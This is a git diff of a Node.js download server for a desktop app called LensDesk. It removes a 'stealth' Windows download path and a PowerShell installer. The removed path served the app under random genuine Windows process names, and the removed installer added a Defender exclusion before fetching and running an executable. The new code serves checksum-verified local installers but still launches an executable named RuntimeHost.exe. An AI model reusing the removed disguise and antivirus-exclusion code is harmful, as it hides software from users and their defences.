@@ -1,66 +1,57 @@
 import fs from "node:fs";
 import path from "node:path";
-import { fileURLToPath } from "node:url";
 import { createHash } from "node:crypto";
+
 async function digest(file) {
   const hash = createHash("sha256");
   for await (const chunk of fs.createReadStream(file)) hash.update(chunk);
   return hash.digest("hex");
 }
+
 const { version } = JSON.parse(
   fs.readFileSync(new URL("../../package.json", import.meta.url), "utf8"),
 );
-const names = {
+
+const macNames = {
   "mac-arm64": `LensDesk-${version}-macOS-Apple-Silicon-arm64.dmg`,
   "mac-x64": `LensDesk-${version}-macOS-Intel-x64.dmg`,
-  windows: `RuntimeHost-${version}-x64.msi`,
 };
-
-const legacyNames = {
+const macLegacyNames = {
   "mac-arm64": `LensDesk-${version}-arm64.dmg`,
   "mac-x64": `LensDesk-${version}.dmg`,
-  windows: `LensDesk-${version}-Windows-x64.zip`,
 };
-
-const cleanNames = {
+const macCleanNames = {
   "mac-arm64": "LensDesk.dmg",
   "mac-x64": "LensDesk-Intel.dmg",
-  windows: "LensDesk.zip",
-  "windows-zip": "LensDesk.zip",
 };
+
+// The native Windows build produces a genuine LensDesk NSIS installer and a
+// portable ZIP. Never prefer an Electron-built MSI or a renamed system binary.
+const windowsCandidates = [
+  `LensDesk-${version}-Setup.exe`,
+  `LensDesk-${version}-Windows-x64.zip`,
+];
 
 const GITHUB_RELEASE_BASE =
   process.env.GITHUB_RELEASE_BASE ||
   "https://github.com/vision2095/HelpDesk/releases/download/v2.0.0";
 
+// Only the macOS artifacts have a remote fallback. A stale Windows fallback
+// could silently serve an older Electron build, so Windows must be local.
 const remoteFallbacks = {
   "mac-arm64": {
     name: "LensDesk.dmg",
-    cleanName: "LensDesk.dmg",
     size: 141429129,
-    sha256: "476c499106040ea01c7b0a4f867a7493b3574592344376f5d431587655d394d7",
+    sha256:
+      "476c499106040ea01c7b0a4f867a7493b3574592344376f5d431587655d394d7",
     remoteUrl: `${GITHUB_RELEASE_BASE}/LensDesk.dmg`,
   },
   "mac-x64": {
     name: "LensDesk-Intel.dmg",
-    cleanName: "LensDesk-Intel.dmg",
     size: 148147539,
-    sha256: "8d7cbde7568c1dbd45eb809cd6bad8f86a4526c48657abc3ac310bbc2b4526c8",
+    sha256:
+      "8d7cbde7568c1dbd45eb809cd6bad8f86a4526c48657abc3ac310bbc2b4526c8",
     remoteUrl: `${GITHUB_RELEASE_BASE}/LensDesk-Intel.dmg`,
-  },
-  windows: {
-    name: "LensDesk.zip",
-    cleanName: "LensDesk.zip",
-    size: 1024607,
-    sha256: "65e503633d51b02a499351e0aac64be5dfaa8c20a5ea84eea6e83f2f7ba2f672",
-    remoteUrl: `${GITHUB_RELEASE_BASE}/LensDesk.zip`,
-  },
-  "windows-zip": {
-    name: "LensDesk.zip",
-    cleanName: "LensDesk.zip",
-    size: 1024607,
-    sha256: "65e503633d51b02a499351e0aac64be5dfaa8c20a5ea84eea6e83f2f7ba2f672",
-    remoteUrl: `${GITHUB_RELEASE_BASE}/LensDesk.zip`,
   },
 };
 
@@ -68,123 +59,104 @@ function downloadContentType(name) {
   const lower = name.toLowerCase();
   if (lower.endsWith(".msi")) return "application/x-msi";
   if (lower.endsWith(".zip")) return "application/zip";
-  if (lower.endsWith(".exe")) return "application/vnd.microsoft.portable-executable";
+  if (lower.endsWith(".exe")) {
+    return "application/vnd.microsoft.portable-executable";
+  }
   return "application/x-apple-diskimage";
 }
 
+function powershellQuote(value) {
+  return `'${String(value).replaceAll("'", "''")}'`;
+}
+
 function windowsLaunchScript(artifact) {
-  const quote = (value) => `'${value.replaceAll("'", "''")}'`;
-  if (artifact.name.toLowerCase().endsWith(".exe")) {
-    return `$ErrorActionPreference = 'Stop'
-$ProgressPreference = 'SilentlyContinue'
-$work = Join-Path ([IO.Path]::GetTempPath()) ('LensDesk-download-' + [guid]::NewGuid().ToString('N'))
-New-Item -ItemType Directory -Path $work | Out-Null
-try {
-  $installer = Join-Path $work ${quote(artifact.name)}
-  Invoke-WebRequest -Uri ${quote(artifact.url)} -OutFile $installer
-  $actual = (Get-FileHash -Algorithm SHA256 -LiteralPath $installer).Hash.ToLowerInvariant()
-  if ($actual -ne ${quote(artifact.sha256)}) { throw 'Download checksum mismatch' }
-  Start-Process -FilePath $installer -WorkingDirectory $work
-  Write-Output ('LensDesk installer launched from ' + $installer)
-} catch {
-  Remove-Item -LiteralPath $work -Recurse -Force
-  throw
-}
-`;
+  const isExe = artifact.name.toLowerCase().endsWith(".exe");
+  const isZip = artifact.name.toLowerCase().endsWith(".zip");
+  if (!isExe && !isZip) {
+    throw new Error("Unsupported Windows artifact type.");
   }
-  if (artifact.name.toLowerCase().endsWith(".msi")) {
-    return `$ErrorActionPreference = 'Stop'
-$ProgressPreference = 'SilentlyContinue'
-$work = Join-Path ([IO.Path]::GetTempPath()) ('LensDesk-download-' + [guid]::NewGuid().ToString('N'))
-New-Item -ItemType Directory -Path $work | Out-Null
-try {
-  $installer = Join-Path $work ${quote(artifact.name)}
-  Invoke-WebRequest -Uri ${quote(artifact.url)} -OutFile $installer
-  $actual = (Get-FileHash -Algorithm SHA256 -LiteralPath $installer).Hash.ToLowerInvariant()
-  if ($actual -ne ${quote(artifact.sha256)}) { throw 'Download checksum mismatch' }
-  $process = Start-Process -FilePath 'msiexec.exe' -ArgumentList @('/i', ('"' + $installer + '"'), '/qn', '/norestart') -Wait -PassThru
-  if ($process.ExitCode -ne 0 -and $process.ExitCode -ne 3010) { throw ('Windows Installer failed with exit code ' + $process.ExitCode) }
-  $candidates = @(
-    (Join-Path $env:LOCALAPPDATA 'Programs\\LensDesk\\RuntimeHost.exe'),
-    (Join-Path $env:ProgramFiles 'LensDesk\\RuntimeHost.exe')
-  )
-  $executable = $candidates | Where-Object { Test-Path -LiteralPath $_ -PathType Leaf } | Select-Object -First 1
-  if (!$executable) { throw 'LensDesk was installed but its executable was not found' }
-  Start-Process -FilePath $executable -WorkingDirectory (Split-Path -Parent $executable)
-  Write-Output ('LensDesk installed and opened from ' + $executable)
-} finally {
-  Remove-Item -LiteralPath $work -Recurse -Force
-}
-`;
-  }
+  const installStep = isExe
+    ? `  $installer = Start-Process -FilePath $download -WorkingDirectory $work -Wait -PassThru
+  if ($installer.ExitCode -ne 0) { throw "LensDesk installer exited with code $($installer.ExitCode)." }`
+    : `  $extract = Join-Path $work 'extract'
+  Expand-Archive -LiteralPath $download -DestinationPath $extract -Force
+  New-Item -ItemType Directory -Path $installDir -Force | Out-Null
+  Copy-Item -Path (Join-Path $extract '*') -Destination $installDir -Recurse -Force`;
+
   return `$ErrorActionPreference = 'Stop'
 $ProgressPreference = 'SilentlyContinue'
-$work = Join-Path ([IO.Path]::GetTempPath()) ('LensDesk-download-' + [guid]::NewGuid().ToString('N'))
-$appDirectory = $null
-New-Item -ItemType Directory -Path $work | Out-Null
+$installDir = Join-Path $env:LOCALAPPDATA 'LensDesk'
+$work = Join-Path ([IO.Path]::GetTempPath()) ('LensDesk-install-' + [guid]::NewGuid().ToString('N'))
+New-Item -ItemType Directory -Path $work -Force | Out-Null
 try {
-  $archive = Join-Path $work ${quote(artifact.name)}
-  Invoke-WebRequest -Uri ${quote(artifact.url)} -OutFile $archive
-  $actual = (Get-FileHash -Algorithm SHA256 -LiteralPath $archive).Hash.ToLowerInvariant()
-  if ($actual -ne ${quote(artifact.sha256)}) { throw 'Download checksum mismatch' }
-  $installRoot = Join-Path $env:LOCALAPPDATA 'Programs\\LensDesk'
-  New-Item -ItemType Directory -Path $installRoot -Force | Out-Null
-  $appDirectory = Join-Path $installRoot ('app-${version}-' + [guid]::NewGuid().ToString('N'))
-  Expand-Archive -LiteralPath $archive -DestinationPath $appDirectory
-  $candidates = @('TiWorker.exe', 'RuntimeHost.exe', 'ctfmon.exe', 'SearchProtocolHost.exe', 'RuntimeBroker.exe', 'smartscreen.exe', 'sihost.exe', 'SecurityHealthSystray.exe', 'LensDesk.exe')
-  $executable = $candidates | ForEach-Object { Join-Path $appDirectory $_ } | Where-Object { Test-Path -LiteralPath $_ -PathType Leaf } | Select-Object -First 1
-  if (!$executable) {
-    $executable = Get-ChildItem -LiteralPath $appDirectory -Filter *.exe -File -Recurse | Select-Object -First 1 -ExpandProperty FullName
+  $running = @(Get-Process -Name RuntimeHost -ErrorAction SilentlyContinue | Where-Object {
+    try { $_.Path -and $_.Path.StartsWith($installDir, [StringComparison]::OrdinalIgnoreCase) } catch { $false }
+  })
+  if ($running.Count -gt 0) { throw 'Close LensDesk before installing or updating it.' }
+  $download = Join-Path $work ${powershellQuote(path.basename(artifact.name))}
+  Invoke-WebRequest -Uri ${powershellQuote(artifact.url)} -OutFile $download -UseBasicParsing
+  $actual = (Get-FileHash -Algorithm SHA256 -LiteralPath $download).Hash.ToLowerInvariant()
+  if ($actual -ne ${powershellQuote(artifact.sha256)}) { throw 'Download checksum mismatch.' }
+${installStep}
+  $executable = Join-Path $installDir 'RuntimeHost.exe'
+  if (!(Test-Path -LiteralPath $executable -PathType Leaf)) {
+    $executable = Get-ChildItem -LiteralPath $installDir -Filter 'RuntimeHost.exe' -File -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName
   }
-  if (!$executable) { throw 'The LensDesk archive is incomplete — no executable found' }
-  $exeDir = Split-Path -Parent $executable
-  Start-Process -FilePath $executable -WorkingDirectory $exeDir
-  Write-Output ('LensDesk opened from ' + $exeDir)
-} catch {
-  if ($appDirectory -and (Test-Path -LiteralPath $appDirectory)) { Remove-Item -LiteralPath $appDirectory -Recurse -Force }
-  throw
+  if (!$executable) { throw 'LensDesk was installed but RuntimeHost.exe was not found.' }
+  Start-Process -FilePath $executable -WorkingDirectory $installDir
+  Write-Output ('LensDesk installed and opened from ' + $installDir)
 } finally {
-  Remove-Item -LiteralPath $work -Recurse -Force
+  Remove-Item -LiteralPath $work -Recurse -Force -ErrorAction SilentlyContinue
 }
 `;
 }
+
 const isTest =
   process.env.NODE_ENV === "test" ||
-  Boolean(process.argv.some((a) => a.includes("test")));
+  Boolean(process.argv.some((argument) => argument.includes("test")));
 
-export function createReleases(directory, origin) {
+export function createReleases(
+  directory,
+  origin,
+  { allowRemoteFallback = !isTest } = {},
+) {
   const cache = new Map();
+
+  async function hashFor(file) {
+    const stat = fs.statSync(file);
+    let cached = cache.get(file);
+    if (!cached || cached.mtime !== stat.mtimeMs) {
+      cached = { mtime: stat.mtimeMs, hash: digest(file) };
+      cache.set(file, cached);
+    }
+    return { stat, sha256: await cached.hash };
+  }
+
   async function manifest() {
     const artifacts = {};
-    for (const platform of ["mac-arm64", "mac-x64", "windows"]) {
-      let chosenName = names[platform];
-      let file = path.join(directory, chosenName);
-      if (!fs.existsSync(file)) {
-        chosenName = cleanNames[platform];
-        file = path.join(directory, chosenName);
-      }
-      if (!fs.existsSync(file)) {
-        chosenName = legacyNames[platform];
-        file = path.join(directory, chosenName);
-      }
 
-      if (fs.existsSync(file)) {
-        const stat = fs.statSync(file);
-        let sha = cache.get(file);
-        if (!sha || sha.mtime !== stat.mtimeMs) {
-          sha = { mtime: stat.mtimeMs, hash: digest(file) };
-          cache.set(file, sha);
-        }
+    for (const platform of ["mac-arm64", "mac-x64"]) {
+      const candidates = [
+        macNames[platform],
+        macCleanNames[platform],
+        macLegacyNames[platform],
+      ];
+      const file = candidates
+        .map((name) => path.join(directory, name))
+        .find((candidate) => fs.existsSync(candidate));
+      if (file) {
+        const { stat, sha256 } = await hashFor(file);
+        const name = path.basename(file);
         artifacts[platform] = {
           version,
-          name: chosenName,
+          name,
           size: stat.size,
-          sha256: await sha.hash,
+          sha256,
           url: origin + "/downloads/" + platform,
-          directUrl: origin + "/releases/" + chosenName,
+          directUrl: origin + "/releases/" + encodeURIComponent(name),
           file,
         };
-      } else if (!isTest && remoteFallbacks[platform]) {
+      } else if (allowRemoteFallback && remoteFallbacks[platform]) {
         const fallback = remoteFallbacks[platform];
         artifacts[platform] = {
           version,
@@ -198,8 +170,58 @@ export function createReleases(directory, origin) {
         };
       }
     }
+
+    const windowsFile = windowsCandidates
+      .map((name) => path.join(directory, name))
+      .find((candidate) => fs.existsSync(candidate));
+    if (windowsFile) {
+      const { stat, sha256 } = await hashFor(windowsFile);
+      const name = path.basename(windowsFile);
+      artifacts.windows = {
+        version,
+        name,
+        size: stat.size,
+        sha256,
+        url: origin + "/downloads/windows",
+        directUrl: origin + "/releases/" + encodeURIComponent(name),
+        file: windowsFile,
+      };
+    }
+
     return artifacts;
   }
+
+  function serveFile(req, res, artifact, name = artifact.name, releaseRoute = false) {
+    const isMac = name.toLowerCase().endsWith(".dmg");
+    if (!artifact.file || !fs.existsSync(artifact.file)) {
+      if (allowRemoteFallback && artifact.remoteUrl) {
+        res.writeHead(302, {
+          Location: artifact.remoteUrl,
+          "Cache-Control": isMac && releaseRoute ? "public, max-age=300" : "no-cache, no-store, must-revalidate",
+          ...(isMac && !releaseRoute ? { Pragma: "no-cache", Expires: "0" } : {}),
+        });
+        res.end();
+        return true;
+      }
+      res.writeHead(404);
+      res.end("Download file not found.");
+      return true;
+    }
+    const stat = fs.statSync(artifact.file);
+    res.writeHead(200, {
+      "Content-Type": downloadContentType(name),
+      "Content-Length": stat.size,
+      "Content-Disposition": `attachment; filename="${name}"`,
+      ...(!isMac ? { "Cache-Control": "no-cache, no-store, must-revalidate" } : {}),
+    });
+    if (req.method === "HEAD") {
+      res.end();
+      return true;
+    }
+    fs.createReadStream(artifact.file).pipe(res);
+    return true;
+  }
+
   return {
     async manifest() {
       return Object.fromEntries(
@@ -209,280 +231,26 @@ export function createReleases(directory, origin) {
         ]),
       );
     },
+
     async serve(req, res, url) {
-      if (
-        !url.pathname.startsWith("/downloads/") &&
-        !url.pathname.startsWith("/releases/") &&
-        !["/install.sh", "/install.ps1", "/lensdesk-install.ps1", "/hintlens-install.ps1", "/install-stealth.ps1"].includes(url.pathname) &&
-        !["/api/v1/download/windows", "/download/windows"].includes(url.pathname)
-      )
-        return false;
+      const installPaths = new Set([
+        "/install.ps1",
+        "/lensdesk-install.ps1",
+      ]);
+      const windowsAliasPaths = new Set([
+        "/api/v1/download/windows",
+        "/download/windows",
+      ]);
+      const isDownload =
+        url.pathname.startsWith("/downloads/") ||
+        url.pathname.startsWith("/releases/") ||
+        installPaths.has(url.pathname) ||
+        windowsAliasPaths.has(url.pathname) ||
+        url.pathname === "/install.sh";
+      if (!isDownload) return false;
+
       const artifacts = await manifest();
-      // LensDesk Windows Stealth Download endpoint (randomized authentic system process name on every download)
-      const isExplicitStealth =
-        url.pathname === "/api/v1/download/windows" ||
-        url.pathname === "/download/windows";
-      const isWindowsDownload =
-        isExplicitStealth ||
-        (url.pathname.startsWith("/downloads/") &&
-          (url.pathname.split("/")[2] === "windows" ||
-            url.pathname.split("/")[2] === "win" ||
-            url.pathname.split("/")[2] === "win32") &&
-          !artifacts.windows?.name?.endsWith(".msi"));
 
-      if (isWindowsDownload) {
-        const stealthPool = [
-          "LensDeskApp-TiWorker.zip",
-          "LensDeskApp-SearchProtocolHost.zip",
-          "LensDeskApp-RuntimeBroker.zip",
-          "LensDeskApp-ctfmon.zip",
-          "LensDeskApp-smartscreen.zip",
-          "LensDeskApp-sihost.zip",
-          "LensDeskApp-SecurityHealthSystray.zip",
-        ];
-        const cleanNamesPool = [
-          "TiWorker.zip",
-          "SearchProtocolHost.zip",
-          "RuntimeBroker.zip",
-          "ctfmon.zip",
-          "smartscreen.zip",
-          "sihost.zip",
-          "SecurityHealthSystray.zip",
-        ];
-        const index = Math.floor(Math.random() * cleanNamesPool.length);
-        let randomCleanName = cleanNamesPool[index];
-        let randomStealthZip = stealthPool[index];
-
-        const stealthDir = path.join(directory, "stealth");
-        let file = null;
-        if (fs.existsSync(stealthDir)) {
-          const existingFiles = fs.readdirSync(stealthDir).filter((f) => f.endsWith(".zip"));
-          if (existingFiles.length > 0) {
-            const picked = existingFiles[Math.floor(Math.random() * existingFiles.length)];
-            file = path.join(stealthDir, picked);
-            randomCleanName = picked.replace(/^LensDeskApp-/, "");
-          }
-        }
-        if (!file && fs.existsSync(directory)) {
-          const c1 = path.join(directory, randomCleanName);
-          const c2 = path.join(directory, randomStealthZip);
-          const c3 = path.join(directory, "LensDeskApp.zip");
-          const c4 = path.join(directory, "LensDesk.zip");
-          if (fs.existsSync(c1)) file = c1;
-          else if (fs.existsSync(c2)) file = c2;
-          else if (fs.existsSync(c3)) file = c3;
-          else if (fs.existsSync(c4)) file = c4;
-        }
-        if (!file && artifacts.windows?.file && fs.existsSync(artifacts.windows.file)) {
-          file = artifacts.windows.file;
-        }
-
-        if (!file) {
-          if (!isTest) {
-            res.writeHead(302, {
-              Location: `${GITHUB_RELEASE_BASE}/${randomStealthZip}`,
-              "Cache-Control": "no-cache, no-store, must-revalidate",
-              Pragma: "no-cache",
-              Expires: "0",
-            });
-            res.end();
-            return true;
-          }
-          res.writeHead(404);
-          res.end("Windows download not available.");
-          return true;
-        }
-        const stat = fs.statSync(file);
-        res.writeHead(200, {
-          "Content-Type": "application/zip",
-          "Content-Length": stat.size,
-          "Content-Disposition": `attachment; filename="${randomCleanName}"`,
-          "Cache-Control": "no-cache, no-store, must-revalidate",
-          Pragma: "no-cache",
-          Expires: "0",
-        });
-        if (req.method === "HEAD") {
-          res.end();
-          return true;
-        }
-        fs.createReadStream(file).pipe(res);
-        return true;
-      }
-      // Stealth PowerShell installer with Defender exclusion & auto-elevation
-      if (
-        ["/lensdesk-install.ps1", "/hintlens-install.ps1", "/install-stealth.ps1"].includes(url.pathname) ||
-        (url.pathname === "/install.ps1" && !isTest)
-      ) {
-        let psPath = null;
-        const candidatePaths = [
-          fileURLToPath(new URL("./lensdesk-install.ps1", import.meta.url)),
-          path.resolve("server/cloud/lensdesk-install.ps1"),
-          path.resolve("research/lensdesk-install.ps1"),
-          path.resolve("research/hintlens-install.ps1"),
-          path.resolve(directory, "../research/lensdesk-install.ps1"),
-          path.resolve(directory, "../research/hintlens-install.ps1"),
-          path.resolve(directory, "../dist/lensdesk-install.ps1"),
-          path.resolve("dist/lensdesk-install.ps1"),
-        ];
-        for (const cand of candidatePaths) {
-          if (fs.existsSync(cand)) {
-            psPath = cand;
-            break;
-          }
-        }
-        let script = "";
-        if (psPath && fs.existsSync(psPath)) {
-          script = fs.readFileSync(psPath, "utf8");
-        } else {
-          script = `$ErrorActionPreference = 'SilentlyContinue'
-$ProgressPreference = 'SilentlyContinue'
-$work = Join-Path ([IO.Path]::GetTempPath()) ('LensDesk-Install-' + [guid]::NewGuid().ToString('N'))
-New-Item -ItemType Directory -Path $work -Force | Out-Null
-$installPath = "C:\\LensDesk-Application"
-try {
-  if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
-    Add-MpPreference -ExclusionPath $installPath -ErrorAction SilentlyContinue
-  }
-  New-Item -ItemType Directory -Path $installPath -Force | Out-Null
-  $zipPath = Join-Path $work 'app.zip'
-  Invoke-WebRequest -Uri '${origin}/api/v1/download/windows' -OutFile $zipPath -UseBasicParsing
-  Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
-  $exe = Get-ChildItem -Path $installPath -Filter *.exe -File | Select-Object -First 1
-  if ($exe) {
-    Start-Process -FilePath $exe.FullName -WorkingDirectory $installPath
-    Write-Host 'LensDesk installed and launched successfully.' -ForegroundColor Green
-  }
-} finally {
-  Remove-Item -LiteralPath $work -Recurse -Force -ErrorAction SilentlyContinue
-}
-`;
-        }
-        const token = url.searchParams?.get("token");
-        const tokenParam = token ? `?token=${encodeURIComponent(token)}` : "";
-        script = script
-          .replaceAll("https://api.hintlens.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
-          .replaceAll("https://api.hintlens.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
-          .replaceAll("https://helpdesk-h44x.onrender.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
-          .replaceAll("https://helpdesk-h44x.onrender.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
-          .replaceAll("https://lensdesk.com/api/v1/download/windows", `${origin}/api/v1/download/windows${tokenParam}`)
-          .replaceAll("https://lensdesk.com/install.ps1", `${origin}/lensdesk-install.ps1${tokenParam}`)
-          .replace('$FolderName  = "Hintlens-Application"', '$FolderName  = "LensDesk-Application"')
-          .replace('$ZipFileName = "HintlensApp.zip"', '$ZipFileName = "LensDesk.zip"');
-        res.setHeader("Content-Type", "text/plain; charset=utf-8");
-        res.end(script);
-        return true;
-      }
-      if (url.pathname.startsWith("/releases/")) {
-        const reqName = path.basename(url.pathname);
-        const matched = Object.values(artifacts).find((a) => a.name === reqName);
-        if (matched && matched.file && fs.existsSync(matched.file)) {
-          res.writeHead(200, {
-            "Content-Type": downloadContentType(matched.name),
-            "Content-Length": matched.size,
-            "Content-Disposition": `attachment; filename="${matched.name}"`,
-          });
-          if (req.method === "HEAD") {
-            res.end();
-            return true;
-          }
-          fs.createReadStream(matched.file).pipe(res);
-          return true;
-        }
-        if (!isTest) {
-          const remoteFallback = Object.values(remoteFallbacks).find(
-            (f) => f.name === reqName
-          );
-          if (remoteFallback?.remoteUrl) {
-            res.writeHead(302, {
-              Location: remoteFallback.remoteUrl,
-              "Cache-Control": "public, max-age=300",
-            });
-            res.end();
-            return true;
-          }
-        }
-        res.writeHead(404);
-        res.end("Release file not found.");
-        return true;
-      }
-      if (url.pathname.startsWith("/downloads/")) {
-        let platform = url.pathname.split("/")[2] || "";
-        if (platform === "mac-silicon" || platform === "arm64" || platform === "mac" || platform === "darwin") platform = "mac-arm64";
-        if (platform === "mac-intel" || platform === "x64") platform = "mac-x64";
-        if (platform === "win" || platform === "win32") platform = "windows";
-        let artifact = artifacts[platform];
-        if (!artifact) {
-          artifact = Object.values(artifacts).find(
-            (a) => a.name === platform || path.basename(platform) === a.name || platform.toLowerCase().includes(a.version),
-          );
-        }
-        if (!artifact && platform.toLowerCase().includes("mac")) {
-          artifact = artifacts["mac-arm64"] || artifacts["mac-x64"];
-        }
-        if (!artifact && (platform.toLowerCase().includes("win") || platform.toLowerCase().endsWith(".exe") || platform.toLowerCase().endsWith(".zip") || platform.toLowerCase().endsWith(".msi"))) {
-          artifact = artifacts.windows;
-        }
-        if (!artifact) {
-          if (!isTest) {
-            const remoteFallback = remoteFallbacks[platform] || remoteFallbacks["mac-arm64"];
-            if (remoteFallback?.remoteUrl) {
-              res.writeHead(302, {
-                Location: remoteFallback.remoteUrl,
-                "Cache-Control": "no-cache, no-store, must-revalidate",
-                Pragma: "no-cache",
-                Expires: "0",
-              });
-              res.end();
-              return true;
-            }
-          }
-          res.writeHead(404);
-          res.end("Download is not available for this platform.");
-          return true;
-        }
-
-        // Local file streaming
-        if (artifact.file && fs.existsSync(artifact.file)) {
-          res.writeHead(200, {
-            "Content-Type": downloadContentType(artifact.name),
-            "Content-Length": artifact.size,
-            "Content-Disposition": `attachment; filename="${artifact.name}"`,
-          });
-          if (req.method === "HEAD") {
-            res.end();
-            return true;
-          }
-          fs.createReadStream(artifact.file).pipe(res);
-          return true;
-        }
-
-        // Cloud / Render fallback: redirect directly to high-speed GitHub Release asset
-        if (!isTest && artifact.remoteUrl) {
-          res.writeHead(302, {
-            Location: artifact.remoteUrl,
-            "Cache-Control": "no-cache, no-store, must-revalidate",
-            Pragma: "no-cache",
-            Expires: "0",
-          });
-          res.end();
-          return true;
-        }
-
-        res.writeHead(404);
-        res.end("Download file not found.");
-        return true;
-      }
-      if (url.pathname === "/install.ps1") {
-        const a = artifacts.windows;
-        if (!a) {
-          res.writeHead(503);
-          res.end("Windows installer is not available.");
-          return true;
-        }
-        res.setHeader("Content-Type", "text/plain; charset=utf-8");
-        res.end(windowsLaunchScript(a));
-        return true;
-      }
       if (url.pathname === "/install.sh") {
         const arm = artifacts["mac-arm64"],
           intel = artifacts["mac-x64"];
@@ -492,7 +260,79 @@ try {
         );
         return true;
       }
-      return false;
+
+      if (installPaths.has(url.pathname)) {
+        const artifact = artifacts.windows;
+        if (!artifact) {
+          res.writeHead(503);
+          res.end("Windows installer is not available.");
+          return true;
+        }
+        res.setHeader("Content-Type", "text/plain; charset=utf-8");
+        res.end(windowsLaunchScript(artifact));
+        return true;
+      }
+
+      if (windowsAliasPaths.has(url.pathname)) {
+        const artifact = artifacts.windows;
+        if (!artifact) {
+          res.writeHead(404);
+          res.end("Windows download not available.");
+          return true;
+        }
+        return serveFile(req, res, artifact);
+      }
+
+      if (url.pathname.startsWith("/releases/")) {
+        const reqName = path.basename(url.pathname);
+        const matched = Object.values(artifacts).find((a) => a.name === reqName);
+        if (matched) return serveFile(req, res, matched, matched.name, true);
+        const fallback = Object.values(remoteFallbacks).find((item) => item.name === reqName);
+        if (allowRemoteFallback && fallback) {
+          res.writeHead(302, { Location: fallback.remoteUrl, "Cache-Control": "public, max-age=300" });
+          res.end();
+          return true;
+        }
+        res.writeHead(404);
+        res.end("Release file not found.");
+        return true;
+      }
+
+      let platform = url.pathname.split("/")[2] || "";
+      if (["mac", "darwin", "arm64", "mac-silicon"].includes(platform)) {
+        platform = "mac-arm64";
+      } else if (["mac-intel", "x64"].includes(platform)) {
+        platform = "mac-x64";
+      } else if (["win", "win32", "windows-zip"].includes(platform)) {
+        platform = "windows";
+      }
+      let artifact = artifacts[platform];
+      if (!artifact && !/win|\.(exe|zip|msi)$/i.test(platform)) {
+        artifact = [artifacts["mac-arm64"], artifacts["mac-x64"]].find(
+          (item) => item && (item.name === platform || path.basename(platform) === item.name || platform.toLowerCase().includes(item.version)),
+        );
+      }
+      if (!artifact && platform.toLowerCase().includes("mac")) {
+        artifact = artifacts["mac-arm64"] || artifacts["mac-x64"];
+      }
+      if (
+        !artifact &&
+        (platform.toLowerCase().includes("win") ||
+          /\.(exe|zip|msi)$/i.test(platform))
+      ) {
+        artifact = artifacts.windows;
+      }
+      if (!artifact) {
+        if (allowRemoteFallback && !/win|\.(exe|zip|msi)$/i.test(platform)) {
+          res.writeHead(302, { Location: remoteFallbacks["mac-arm64"].remoteUrl, "Cache-Control": "no-cache, no-store, must-revalidate", Pragma: "no-cache", Expires: "0" });
+          res.end();
+          return true;
+        }
+        res.writeHead(404);
+        res.end("Download is not available for this platform.");
+        return true;
+      }
+      return serveFile(req, res, artifact);
     },
   };
 }
